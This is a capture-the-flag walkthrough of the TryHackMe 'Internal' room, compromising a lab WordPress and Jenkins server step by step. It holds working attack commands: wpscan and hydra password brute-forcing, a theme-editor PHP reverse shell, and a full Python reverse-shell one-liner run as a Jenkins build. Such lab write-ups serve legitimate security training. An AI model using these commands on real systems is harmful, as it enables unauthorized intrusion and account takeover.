This is a walkthrough of the [TryHackMe][thm] room: [Internal][internal]. Let’s get started!

This room is designed to be as close to a “real-world” pentest as possible. It comes with a Scope of Work (SOW) so make sure to read through that, and understand it. Then let’s start with enumeration.

# User Flag
Let’s start by scanning the server using rustscan. This is a much faster scanner than `nmap`, and I like using it because it scans all 65535 ports and then passes the open ones to `nmap`. You can find more about it [here][rustscan].

rustscan command: `rustscan -a <machine_ip> -- -A -A`

Looks like we have 22 and 80 open. Let’s visit the website!

![i2](/assets/images/thm/internal/i2.webp)

Looks like we have a default page. We can run `dirsearch` to enumerate directories.

`dirsearch -u http://<machine_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e html,php -t 100`

Right away we find a few options. Let’s check them out.
**NOTE:** Make sure to add the `<machine_ip> internal.thm` to your `/etc/hosts` file or some of the sites may not work.

We find a `/wordpress` directory. When we navigate there, we find a link for a login page.

![i3](/assets/images/thm/internal/i3.webp)

At `/blog` we find the blog page of the wordpress site. There also is a `/phpmyadmin` page. Wow! Lot’s to work with here. I am going to leave `dirsearch` running in the background and start with WordPress. Let’s scan it! I am going to use `wpscan` for this. This can be found [here][wpscan].

`wpscan --url http://internal.thm/wordpress -e u`

![i4](/assets/images/thm/internal/i4.png)

If you take a look at the enumerated users, we see an `admin` user. Let’s see if we can brute force the login!

`wpscan --url http://internal.thm/wordpress -U admin -P rockyou.txt`

![i6](/assets/images/thm/internal/i6.png)

Let’s login!

Once we login, we know we can always do a reverse shell! Let’s get the reverse-shell from [here][rev-sheet]. Change the IP and Port.

Now navigate to the **Theme Editor**. Select **404 Template** from the **Theme Files**

Paste in your reverse-shell code. Start a netcat listener. `nc -nvlp 1234`

Navigate to:

`http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php`

Let’s just start by looking around. I stumble upon the `/opt` folder and there is an interesting file: `wp-save.txt` We find some credentials in here!

![i8](/assets/images/thm/internal/i8.png)

Let’s try to ssh into the machine with those credentials!

We are in! Let’s see if there is a `user.txt` flag!

![i9](/assets/images/thm/internal/i9.png)

# Root Flag
Now we need to do some privilege escalation. Let’s use [LinPEAS][linpeas] for this! Get it onto the system by starting a python http server:

`python3 -m http.server 80`

And then download onto the server with `wget`

`wget http://<thm_ip>/lin.sh`

Make sure to `chmod +x lin.sh` and then run it: `./lin.sh`

That didn’t come back with a ton of useful info, but there was a lot there. I did see a `jenkins.txt` in the `/home/aubreanna` directory earlier.

![i10](/assets/images/thm/internal/i10.png)

We may be able to access this with `ssh` tunneling! On our machine:

`ssh -L 1235:172.17.0.2:8080 aubreanna@<machine_ip>`

In your browser, navigate to: `localhost:1235`

We have a login page!

![i11](/assets/images/thm/internal/i11.png)

Let’s checkout a POST request to the server. We can try to brute force the login with `hydra`

![i12](/assets/images/thm/internal/i12.png)

Use this info to create our `hydra` command:

```bash
hydra -l admin -P rockyou.txt 127.0.0.1 -s 1235 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

We found credentials!

![i13](/assets/images/thm/internal/i13.png)

Login with those credentials. Let’s create a New Project. Name it whatever you want, and navigate to the **Build** tab and select: **Execute shell**. Now let’s have Jenkins execute a reverse shell back to our machine (If one doesn’t work, there are many others you can try: [Link][rev-sheet]):

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_ip",2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Save** this build. Now start a netcat listener on your machine: `nc -lvnp 2345`

Select **Build Now** in **Jenkins**.

Success! Now let’s look around! Eventually, we find a `note.txt` in `/opt`

![i14](/assets/images/thm/internal/i14.webp)

Let’s `ssh` into the machine with the `root` credentials!

Now let’s print the `root.txt` flag!

# Review
Wow. That is all I can say. This was definitely a tough one for me and took a ton of patience and looking around. Not only with the various points of entry that can eat up a lot of time, but also having to research some new ways to exploit the machine! Great job to the creator: TheMayor!
